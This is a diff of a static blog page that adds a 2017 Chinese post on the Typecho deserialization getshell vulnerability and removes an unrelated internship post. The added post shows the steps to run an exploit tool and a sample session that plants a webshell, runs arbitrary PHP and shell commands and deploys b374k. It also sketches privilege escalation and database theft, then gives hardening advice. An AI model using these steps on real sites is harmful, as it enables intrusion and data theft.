@@ -73,6 +73,103 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-typecho-exploit/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/10/31/typecho-exploit/index/" class="article-date">
+  <time class="dt-published" datetime="2017-10-31T00:00:00.000Z" itemprop="datePublished">2017-10-31</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/justsay/">justsay</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/10/31/typecho-exploit/index/">谈谈近期Typecho 的漏洞exploit及预防措施</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>几天前（28日好像是）Typecho被爆出getshell漏洞，想想还是很可怕的。 [v_error]噢对了，我忘记说了，本文仅供学习交流，请不要在未授权的环境中使用此工具。我图中的测试站，是我现搭建的(对就是不想告诉大家我究竟有多少个域名和服务器…)……你就看那个主机名，miss-ed，思念还是错过，多么符合我的文风啊！[&#x2F;v_error]</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>服务器环境</p>
+<blockquote>
+<p>nginx&#x2F;1.9.5</p>
+<p>PHP 7.0.22</p>
+<p>mysql Ver 14.14 Distrib 5.5.48</p>
+<p>Typecho 1.1 (17.4.24)（好像是1013还是10月28日之前的都有这个问题）</p>
+</blockquote>
+<p>有没有人想问为什么是Nginx 1.9.5这么老的版本吗……唔</p>
+<p><img src="/images/103117_0858_Typecho1.png"></p>
+<p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/923164944278814721">真是没有比我还蠢的人了</a></p>
+<p>利用条件：PHP对webroot拥有写入权限，www的600就够了。如果Typecho对目录没有写权限，那么……没得玩了。</p>
+<p>小知识：很多人对Linux中文件目录权限（rwx）的理解可能是有一些偏差的，以下说明不包含root这个天神，root可以无视这三个基础权限的：</p>
+<p>对于文件来说，r代表着能够对文件进行读取；w代表着能够对文件内容进行更改（比如说删除一行，增加一行等等），但是w权限并不意味着能够删除文件；x意味着文件可以作为可执行程序，系统不会告诉你一个permission denied</p>
+<p>对于目录来说，r意味着能够对目录下的内容进行list，比如说ls test这就意味着你对test要至少有r才能执行ls；w意味着能够对目录下的文件进行删除、创建、重命名；x意味着能够进入该目录成为工作目录，也就是能够cd test</p>
+<p>可能有很多人以为，对文件有w权限就能删掉它了吧？不是的哦，是要对文件所在的目录有w权限才可以的。下面的图是一个简单的验证： <img src="/images/103117_0858_Typecho2.png"></p>
+<h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/Typecho/_deserialization/_exploit'/]GitHub%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/Typecho\_deserialization\_exploit&#39;\]GitHub开源地址\[/gt\]</a></p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/BennyThink/Typecho/_deserialization/_exploit">https://github.com/BennyThink/Typecho\_deserialization\_exploit</a><br>cd Typecho_deserialization_exploit<br>python exp.ty</p>
+<p>之后根据提示操作，示例输出：</p>
+<blockquote>
+<p>root@qcloud:~&#x2F;Typecho_deserialization_exploit# python exp.py 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;1 Input your target, i.e:<a target="_blank" rel="noopener" href="http://localhost/ty">http://localhost/ty</a> &gt;<a href="https://example.com/">https://example.com</a> Your target url is <a href="https://example.com/">https://example.com</a> shell: <a href="https://example.com/p0.php">https://example.com/p0.php</a> 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;2 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 Enter your PHP code: &gt;echo ‘pwned’; pwned 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;3 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 Enter your system commands: &gt;ls 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;4 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 visit <a href="https://example.com/b374k.php">https://example.com/b374k.php</a> 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;</p>
+</blockquote>
+<p>成功写入webshell，第三步执行系统命令没有回显是因为我禁用了<code>system()</code>函数</p>
+<p><img src="/images/103117_0858_Typecho3.png"></p>
+<p><img src="/images/103117_0858_Typecho4.png"></p>
+<p>由于运行PHP的用户是一个低权限的non-login shell用户www，所以嘛……没有SMB那么爽的感觉了。当然Windows就没有这个说法了，说不定人品好，还有人是拿管理员运行的PHP呢……这个时候就可以有mimikatz了。</p>
+<h2 id="更进一步的玩法"><a href="#更进一步的玩法" class="headerlink" title="更进一步的玩法"></a>更进一步的玩法</h2><p>只是一点点猜想，仅供参考</p>
+<h3 id="内核提权漏洞"><a href="#内核提权漏洞" class="headerlink" title="内核提权漏洞"></a>内核提权漏洞</h3><p>通过<code>phpinfo</code>拿到系统信息，去exploit找对应的内核提权漏洞，想办法吧www提权成root</p>
+<h3 id="脱库与跑路"><a href="#脱库与跑路" class="headerlink" title="脱库与跑路"></a>脱库与跑路</h3><p>通过读取Typecho的配置文件<code>config.inc.php</code>拿到数据库账号密码，塞满垃圾文件，脱库与跑路什么的；顺着搜搜有没有MySQL的什么安全漏洞可以利用、绕过。</p>
+<h3 id="报告给博主"><a href="#报告给博主" class="headerlink" title="报告给博主"></a>报告给博主</h3><p>对，这才是正经的嘛……当然了，那些连个联系方式也不留的、八百年不发一篇博文的、whois查不到邮箱的、评论也不管的死灰一样的博客，那活该了。我也很无奈啊。</p>
+<h2 id="预防措施和一些建议"><a href="#预防措施和一些建议" class="headerlink" title="预防措施和一些建议"></a>预防措施和一些建议</h2><h3 id="升级Typecho到最新的版本或者删除文件"><a href="#升级Typecho到最新的版本或者删除文件" class="headerlink" title="升级Typecho到最新的版本或者删除文件"></a>升级Typecho到最新的版本或者删除文件</h3><p>升级Typecho到最新版本，或者删除<code>install.php</code>和<code>install</code>目录。暂时不能更新的，关站保平安吧。</p>
+<h3 id="使用www、mysql等non-login-shell用户运行Apache-x2F-Nginx、PHP、MySQL"><a href="#使用www、mysql等non-login-shell用户运行Apache-x2F-Nginx、PHP、MySQL" class="headerlink" title="使用www、mysql等non-login shell用户运行Apache&#x2F;Nginx、PHP、MySQL"></a>使用www、mysql等non-login shell用户运行Apache&#x2F;Nginx、PHP、MySQL</h3><p>千万不要拿root跑啊，这要是拿root跑了，那就和SMB漏洞是一样一样滴爽。</p>
+<h3 id="记得更新系统，不要使用已无支持的操作系统"><a href="#记得更新系统，不要使用已无支持的操作系统" class="headerlink" title="记得更新系统，不要使用已无支持的操作系统"></a>记得更新系统，不要使用已无支持的操作系统</h3><p>EOL（End of Life）的就不要用了，没有安全更新，万一被人找到提权，那不就完蛋了吗。</p>
+<p>举例说明，Windows XP，Windows 2003，Windows Vista，CentOS 5,Ubuntu 12.04等等……</p>
+<p>对于发行版来说，可以用cron来计划更新，比如说我是这么干的：</p>
+<p>0 3 *&#x2F;3 * * apt update &amp;&amp; apt upgrade -y</p>
+<p>每隔三天的凌晨三点都会更新一波</p>
+<h3 id="尽可能的使用Linux当服务器"><a href="#尽可能的使用Linux当服务器" class="headerlink" title="尽可能的使用Linux当服务器"></a>尽可能的使用Linux当服务器</h3><p>嗯……如果你用Windows的话，在这种情况下webshell就可以大显神通了……</p>
+<h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>配置<code>open_basedir</code>,不让PHP程序访问本身目录以外的目录，比如说我是这么配置的：</p>
+<p>open_basedir&#x3D;&#x2F;home&#x2F;wwwroot&#x2F;dmesg.app:&#x2F;tmp&#x2F;:&#x2F;proc&#x2F;</p>
+<p>并且如果不需要的话，那么就禁用一些比较危险的函数，比如说<code>system()</code>、<code>exec()</code></p>
+<h3 id="别没事干就777"><a href="#别没事干就777" class="headerlink" title="别没事干就777"></a>别没事干就777</h3><p>除非你懂得777是什么意思，知道你这次的777有何影响。</p>
+<p>别说777了，任何更改文件目录（包括web目录）权限的操作都要三思而后行，尤其是某些特别敏感的文件，比如说如果某人的<code>/etc/shadow</code>的权限是644（原本应该是640），那么任何人都可以读取了……</p>
+<p>小提示：Linux下默认文件目录权限是怎么回事</p>
+<p>Linux下有一个东西叫做<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Umask">umask</a>，一般发行版都会是0022，我们只看后三位022，0意味着不拿掉任何权限，2代表拿掉2写权限。</p>
+<p>所以对于目录来说，最高权限是rwxrwxrwx（777），那么同组和其他人拿掉写权限，也就是rwxr-xr-xr，换成数字就是755啦；</p>
+<p>而文件呢，要比目录再少一个x权限，也就是再<strong>拿掉x</strong>，那么文件就是rw-r–r–也就是644了。为啥要把文件拿掉x可执行权限啊？可执行太危险了呗。</p>
+<p>请一定要注意，<strong>不要做减法</strong>（7-2&#x3D;5）！！这样在umask已经拿掉x权限时（umask值包含1，3，5）会出错的。比如说如果umask是011，那么做减法，目录是766（rwx-rw-rw），文件是655（rw-r-xr-x），文件已经拿掉了x，怎么又出现了x呢？？是吧。正确的应该是目录rwx-rw-rw（766），文件拿掉x变为rw-rw-rw（666）</p>
+<h3 id="开启App-Armor、SELinux等"><a href="#开启App-Armor、SELinux等" class="headerlink" title="开启App Armor、SELinux等"></a>开启App Armor、SELinux等</h3><p>不好意思，这个我不太会玩……不过……很多人拿到一台CentOS都是……第一步……关闭SELinux的吧……</p>
+<h2 id="更多参考资料"><a href="#更多参考资料" class="headerlink" title="更多参考资料"></a>更多参考资料</h2><p><a target="_blank" rel="noopener" href="http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/">ph0rse</a> <a target="_blank" rel="noopener" href="https://joyqi.com/typecho/about-typecho-20171027.html">joyqi</a> <a target="_blank" rel="noopener" href="http://www.blogsir.com.cn/safe/454.html">blogsir</a> <a target="_blank" rel="noopener" href="https://github.com/b374k/b374k">b374k</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此次漏洞的影响还是比较大的，至少吧……攻击者能够拿到webshell，再怎么也能拿到整个数据库的权限了。</p>
+<p>哦对，trick or treat?</p>
+<blockquote>
+<p>賢狼ホロ：?羡慕高产（</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/10/31/typecho-exploit/index/" data-id="clhp7rtmj00aas2qr5aaxhk60" data-title="谈谈近期Typecho 的漏洞exploit及预防措施" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-my-love/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2017/10/29/my-love/index/" class="article-date">
@@ -896,109 +993,6 @@ window.open("http://www.zimuzu.tv/search/index?keyword="+document.getElementById
 
 
   
-    <article id="post-internship/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2017/08/11/internship/index/" class="article-date">
-  <time class="dt-published" datetime="2017-08-11T00:00:00.000Z" itemprop="datePublished">2017-08-11</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/justsay/">justsay</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2017/08/11/internship/index/">在Cisco实习的经历</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>好吧，这是俺第一篇连续五天写出来的博文（面试什么的是俺的回忆啦）。</p>
-<h2 id="实习生申请"><a href="#实习生申请" class="headerlink" title="实习生申请"></a>实习生申请</h2><p>本来吧，在今年春季学期开学的时候，我是打算投另一个很有名的Y公司的，可以说得上是<strong>孤注一掷</strong>吧；后来偶然听说Cisco也来招聘实习生，于是我就去申请了。在五月末六月初，经过投递简历、宣讲会、笔试和面试，终于得到了offer，那时候也恰好是得知自己通过专八的时候，于是大学的俩梦想就这样完美了。嘿嘿，可是第三个梦想呢，遥遥无期，毫无希望，<strong>也许就是这样吧</strong>。</p>
-<p>后来看到邮件，果然没有通过Y公司的简历筛选，你丫丫，我很认真的投递简历的哎，反正……据说Y公司在我这也不是这家公司的正统业务，也正好吧。</p>
-<p>据统计，Cisco总计收到了简历700多封，其中大概有300人通过笔试进入面试，最后在面试中成功获得offer的有60人左右，俺还是蛮幸运的吧，哈哈。</p>
-<p>说说俺对这家公司的印象或者说是感觉？其实俺因为某些原因一直对这公司有一点点不先入为主的、太好的印象的，具体是啥原因呢，俺不能说，说了就暴露了哈哈。</p>
-<h2 id="宣讲会与笔试"><a href="#宣讲会与笔试" class="headerlink" title="宣讲会与笔试"></a>宣讲会与笔试</h2><p>我一共参加了两场宣讲会，一场是我自己学校的，另一场是陪另一个因故无法参加此次宣讲会的小伙伴去别的学校参加的。不得不说，大公司就是不一样，足足讲了接近两个小时吧，介绍了Cisco的历史以及一些福利待遇什么的。</p>
-<p>宣讲会之后自然是进行笔试了，笔试试题的是彩印的，印刷质量很好，并且Cisco的HR反复强调不要在试题册上作答，因为他们要循环利用这个试题册（从页眉上也能看出来这套试题用了很多次了）。</p>
-<p>那笔试内容都有啥呢？</p>
-<p>好吧，咱得说，这试题基本上都是英文的，难度不是很大，题型很活跃涉及范围很广泛，其实也可以说是很逗的啦。具体内容就不太方便多说啦。</p>
-<p>Cisco不会以笔试题的成绩来卡分，就是说，不是只有某个特定分数（比如说60分）以上的人才有面试的机会，应该是要综合看简历的吧。</p>
-<h2 id="没有回答上问题的面试"><a href="#没有回答上问题的面试" class="headerlink" title="没有回答上问题的面试"></a>没有回答上问题的面试</h2><p>关注俺推特的小伙伴们可能知道俺面试都经历了啥。其实也没啥好说的，就是HR会看俺的简历，然后跟着简历问一些问题，态度超级和善有说有笑的；之后又进行了一次语言的面试，就是随意的聊聊天，不讨论技术问题。</p>
-<p>俺自我感觉吧，俺这个专八是白过了，英语说得一塌糊涂，哎，看来表达能力还需要提高啊，哎哎哎！</p>
-<h2 id="实习开始之前……"><a href="#实习开始之前……" class="headerlink" title="实习开始之前……"></a>实习开始之前……</h2><p>唔……好吧，自然是准备各种资料啊什么的，当然还有一个非常重要的、严肃的问题就是租房子。咦，这可要感谢俺姐、俺姐夫还有俺娘（小嘎：那我呢？哎你一边吃糖去哈J）。</p>
-<p>俺周末的时候在公司附近跑了两天，怎么说呢——好货不便宜呗。最终俺还是花了实习补助的一大半租了一个比较如意的小房间吧。哎……</p>
-<p>之后俺就在想，也很纠结啊，得想办法赚点外快了，要不真的很难生活在这市中心啊。鉴于俺过了专八、有着不错的IT功底，给人翻译点东西、做做课设毕设啥的补贴下昂贵的房租和生活成本，应该还是可行的吧。不知道读者们（推友们）有何更好的建议？俺很想知道，俺想要多赚点钱啊。</p>
-<p>很快，自己的生活就要开始了，需要自己打理好一切，而这和学校无忧无虑的生活是不一样的！</p>
-<h1 id="Orientation"><a href="#Orientation" class="headerlink" title="Orientation!!!"></a>Orientation!!!</h1><h2 id="实习生-Day-1"><a href="#实习生-Day-1" class="headerlink" title="实习生 Day 1"></a>实习生 Day 1</h2><p>以前在上课的时候，俺总是早上第一个到的人，实习生活第一天竟然六点半就醒了。起来洗漱收拾，准备好材料到公司发现早就有人到了。</p>
-<p>HR姐姐带我们去了会议室，这个会议室叫啥呢，俺不能说，说了就又暴露了，哎写个文章也不容易。但是俺知道这个会议室名字的时候是一脸吃惊的(⊙ˍ⊙)</p>
-<p>之后HR姐姐为我们发放了badge（就是员工身份牌），还有check list，桌面上也放着一份这一周的schedule。</p>
-<p>在check list上写着员工的编号，右侧还告诉俺们怎么连Wi-Fi。要知道在学校，我可是我那一层楼<strong>第一个连接上校园网</strong>的人（我上学的时候入住的是新楼，那时候新楼的校园网还没有建设好），于是俺就争做第一人，用我的身份连接上了公司的Wi-Fi。公司自然是使用WPA2-Enterprise啦，也就是802.1x。</p>
-<p>连上Wi-Fi的第一件事情是什么，打开ip.cn看看是哪个运营商，再用speedtest测速。得出的结果令我震惊：香港的IP、速度超过4000KB&#x2F;s。哦我的天，能直接翻墙？立刻打开推特，哇真的能啊！而且还能多点登录哦，再也不用担心莫名其妙的掉线、被踢什么的了。</p>
-<p>从那一刻起，我就已经下定决心要好好努力留在Cisco了，这环境简直爽歪歪啊！</p>
-<p>少年，人心是会变的！</p>
-<p><img src="/images/081117_0303_2.png"></p>
-<p>Speedtest测速</p>
-<p>中午的时候，Cisco提供了一个”welcome lunch”，还是很丰盛的（可以说是我近几天以来吃过的最丰盛的一顿饭吧），之后我和几个小伙伴去附近转了转，一些设施还是很齐全的。</p>
-<p>为了让我们互相认识，首先来了个自我介绍，哎，玩王者荣耀的人这么多？俺说的啥？<strong>俺喜欢写博客，也喜欢读博客</strong>呗，嘿嘿。然后HR叫我们准备一个名字为”3 facts”的游戏，这是个啥呢，就是写三个关于自己的事情，其中有一个是假的，让大家猜猜哪个是假的，2 facts and a lie嘛，哈哈。</p>
-<p>晚上的时候，Cisco开始发东西啦，发了一件T恤，一个质量很不错的电脑包，当然还有电脑啦。看着身边的小伙伴们一个一个拿着崭新的、带着包装盒的ThinkPad X1 Carbon，我那叫一个羡慕啊。轮到我的时候，竟然给我发了个旧的ThinkPad T440 :sad: ，貌似我这个职位（大概十几个人）都给的旧的？虽说吧，给俺发的是旧电脑，但是成色也是不错的，配置也很不错，就是那贴纸暴露了上一个主人一定是个<strong>可爱的萌妹子</strong>。当然啦，俺要重点说说X1，Cisco给发的是i7版的X1（貌似是顶配了），这个本超级轻，也很薄，真的和MacBook一样轻薄，而且显示效果很炫彩很鲜艳，有键盘背光，256G的固态还支持指纹，哇我真是一脸羡慕。</p>
-<p>俺这电脑配置其实也很牛，网卡都是双频，支持5G哦。</p>
-<p><img src="/images/081117_0303_3.png"></p>
-<p>这内网传文件，恐怕是要爽到爆啊</p>
-<p>很明显这电脑都是”特殊定制”的，需要输入我自己的身份认证信息才能用，之后就是一些配置啦，配置IM、视频会议系统和VPN啦。不要一提到VPN就想到翻墙，VPN的设计初衷是为了让员工们在家就能访问到企业内网而达到远程办公的目的的。当然啦，如果我在不能翻墙的地方用VPN连接到公司，那就应该能翻墙了。啊哦对，别想着跟俺借这个账号，俺是不会答应的！</p>
-<p>关于工作时间？基本上就是朝九晚五那样吧其实是不打卡，弹性工作时间，双休，还是<strong>很幸福</strong>的。了解我的小伙伴们可能知道，我本人<strong>非常讨厌996</strong>，内心也是拒绝加班的，因为我很”懒”啊，这也是我讨厌某些企业（比如说华为，可以说是跳梁小丑了）的原因之一。俺不是来<strong>出卖劳动力或者是充当廉价劳动力</strong>的，俺是来实现自我价值、努力求得共赢的。哎嘿嘿什么蛇和大象？</p>
-<p>晚上HR姐姐跟我们说，注册个Facebook？五个月之前我才删除Facebook账号啊，要不要这么悲剧？新注册的还被suspend了……</p>
-<p>哦对了，得说下，这里的session讲的PPT什么的全都是英文的，不用说电脑也是英文版的Windows 10，毕竟嘛……好吧，<strong>学好英语真的很重要啊</strong>，非常重要的啊，特别重要啊，<strong>英语不好真的特别吃亏的（哪怕读者们外语主修不是英语）</strong>……俺在半年前的<a target="_blank" rel="noopener" href="https://dmesg.app/other-than-tech.html">《除了技术》</a>里已经很强调这一点了。</p>
-<h2 id="实习生-Day-2"><a href="#实习生-Day-2" class="headerlink" title="实习生 Day 2"></a>实习生 Day 2</h2><p>Day 2的时候，也就是各种介绍什么的。当然了，有我最喜欢的3 Facts呀！这个过程还是很欢乐的，尽管我还是没能记下来几个名字。有些童鞋们真的是演技派，有些一眼就能看出来在说谎。要不要大家看看我的3 Facts？虽说还没有轮到我上台编瞎话。</p>
-<p><img src="/images/081117_0303_4.png"></p>
-<p>我的 3 facts</p>
-<p>读者们来猜猜？我想大部分人都会猜错哦。想要猜的小伙伴可以给我发<a target="_blank" rel="noopener" href="https://t.me/BennyThink">Telegram</a>、<a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks">Twitter</a>私信或者邮件、本文评论，万一猜中有奖呢是不！</p>
-<p>后来我们需要做一个online courses and tests，自然要把电脑搬回家连VPN了┗|｀O′|┛ 嗷~~</p>
-<p>俺这个职位，还是要学习很多东西的（虽说大部分俺都稍有接触）比如说Linux啦，Python&#x2F;Java&#x2F;Shell啦，，数据库啦。太多就不方便说了</p>
-<p>啊呀对呢，在会议休息的时间，还有零食和饮料呢，(╹ڡ╹ )</p>
-<h2 id="实习生-Day-3"><a href="#实习生-Day-3" class="headerlink" title="实习生 Day 3"></a>实习生 Day 3</h2><p>第三天的时候，安全部门的前辈们来给我们介绍了一些信息安全的常识吧，比如说木马呀、钓鱼邮件呀， 一些注意事项比如说使用指定的电脑以及badge、网络使用条例（比如说不能用P2P下载啊什么的）、防止尾随等等保护公司知识产权和财产的措施与手段。</p>
-<p>俺们公司的文件，一共有四个等级，估计大部分公司都是这样的，对外公开的，机密的，还有更高等级更机密的两种。比如说我们这几天培训的资料、笔试题，就属于机密这个”第二机密”的。所以你看在这，我不能把check list、培训网页的截图等等信息分享出来。</p>
-<p>啊哟对了，今天轮到我上台做3 facts，为啥大家都在笑呢，是因为俺太滑稽了吗？好吧，<strong>俺编瞎话的能力还是很强的</strong>，每个fact都有很多人认为是假的。可是认为第一个是假的的童鞋们，要对俺有信心啊！俺博客……以后的某天，日均PV肯定会过500的啊！</p>
-<p>下午的时候，俺这个小部门的人去见了mentor，就是宣讲会的时候那个特特特帅的大哥哥！俺这个部门的人比较少，只有九个，因为可能是筛选了一些自学能力非常强的童鞋吧。从此以后俺们就是一家人了，请让俺在看会照片记一下大家的脸。我们大概也就谈了谈以后将要学习哪些语言和工具，咦，看来Python真的是世界上最好的语言了，欢迎PHP党来戳死俺。好吧，Python + Flask，俺相信友情链接和推友里一定有这方面的老鸟。还望多多关照、不吝赐教！</p>
-<h2 id="实习生-Day-4"><a href="#实习生-Day-4" class="headerlink" title="实习生 Day 4"></a>实习生 Day 4</h2><p>今早我们做了一个很好玩的小游戏，就是分成几组，每组都给一张纸，上面写着会唱歌、会跳舞、会剪辑视频、参加过某某比赛等内容，然后需要到其他组找到这样的人然后来签名。第一个完成的组就算赢了。咦，那些会跳舞会唱歌的孩子们自然……要证明他们没有说谎了哦！</p>
-<p>之后的一个环节是屏幕上显示出Cisco的六个价值观，比如说change the world，innovation，do the right thing等等，让我们自我选择，然后上台演讲说说自己对选择的这个价值观的一些理解吧。当然啦，俺非常喜欢Google的那句”Don’t be evil”，所以自然而然的选择了Do the right thing。可是可怕的事情来了，选择俺这个的，总计才有三个人。其实想一想，人少也是有好处的，这样每个人上台表现的时间就会多了（虽说好像有的时候不知道该说什么的时候，冷场确实蛮尴尬的）。</p>
-<p>其实回忆下，我在很多人面前演讲啊什么的次数并不是很多，还总是有那么点害怕和胆怯吧。</p>
-<p>所以，对于这个话题，俺都说了些啥？俺自然是从”不作恶”出发，说了些怎么才算”不作恶”，对待极权政府的不合理审查应该怎样面对。顺便说了下我曾经的博文里说过的内容，比如说<a target="_blank" rel="noopener" href="https://dmesg.app/net-neutrality.html">net neutrality</a>啊什么的。</p>
-<blockquote>
-<p>Speak not because it is safe, but because it is right.</p>
-</blockquote>
-<h2 id="实习生-Day-5"><a href="#实习生-Day-5" class="headerlink" title="实习生 Day 5"></a>实习生 Day 5</h2><p>Day 5话，其实没什么事情，就是去完成check list，下午去了趟“Giving back”做志愿者，晚上和大家一起TB。TB是个啥呢？当然不是淘宝了，就是“Team Building”，俺也不知道咋翻译，简单理解就是聚餐吧。终于在和吃饭的时候认识全了我这个部门的9个人，又认识了一个漂亮的学姐，哈哈，好开心！</p>
-<p>于是，orientation就算是结束了，终于迎来了周末；下周，学习生活算是真正开始了吧……嗯哼。</p>
-<h2 id="最后的一些感想"><a href="#最后的一些感想" class="headerlink" title="最后的一些感想"></a>最后的一些感想</h2><p>或者说是感悟吧，嗯哼？</p>
-<p>就是俺觉得，Cisco真的挺不错的；办公环境很好，员工的福利也很多（尽管俺是实习生），前辈们也很有耐心，很多原因吧。至少俺要留在Cisco。</p>
-<p>哦对了，小计划的一颗种子已经埋下来了呢。尽管可能没人在乎，<strong>似乎本身就应该没人在乎啊</strong>。但是那晚谈话的<strong>每一句话真真切切的是认真的呢</strong>。虽说我依旧在孤注一掷（孤注一掷似乎成为了我最大的缺陷，明知道结果却还<strong>那么傻</strong>），但是，谁知道呢，谁在乎呢。哈哈，文风瞬间转成”I don’t give a shit”，好吧(；′⌒`)</p>
-<p>当然，俺得努力，”虽说title是实习生，但是要把自己当作正式员工看待”，很没底气的说，俺终于可以努力去当第一名了，毕竟这是俺从小以来的爱好，毕竟这是俺喜欢的东西，毕竟俺叫小土豆（这个，育碧的土豆不好吃也不能吃，容易中毒。<strong>珍爱生命远离毒……土豆</strong>）。</p>
-<p>俺经常说Remember me，亲爱的你，你说是不是？</p>
-<p>人生啊，总是会发生变动的。总有一天我也会离开Cisco，那么我是会开心还是会后悔呢。我不知道，至少现在还不知道。也许到那天，我会再写一篇来说说这件事情吧。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/08/11/internship/index/" data-id="clhp7rtgv0044s2qr1vsugg1p" data-title="在Cisco实习的经历" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1056,6 +1050,10 @@ window.open("http://www.zimuzu.tv/search/index?keyword="+document.getElementById
       <ul>
         
           <li>
+            <a href="/2024/10/12/aca-php/index/">用 Azure Container Apps 运行PHP网站</a>
+          </li>
+        
+          <li>
             <a href="/2024/10/06/aca-vm-scale/index/">Azure Container Apps 连接到虚拟机并配置CPU自动缩放</a>
           </li>
         
@@ -1069,10 +1067,6 @@ window.open("http://www.zimuzu.tv/search/index?keyword="+document.getElementById
         
           <li>
             <a href="/2024/09/21/one-api-clickhouse/index/">one-api/new-api性能优化：使用 ClickHouse 作为日志系统</a>
-          </li>
-        
-          <li>
-            <a href="/2024/08/03/stripe-fraud/index/">Stripe 如何安全收款并避免盗刷与测卡</a>
           </li>
         
       </ul>
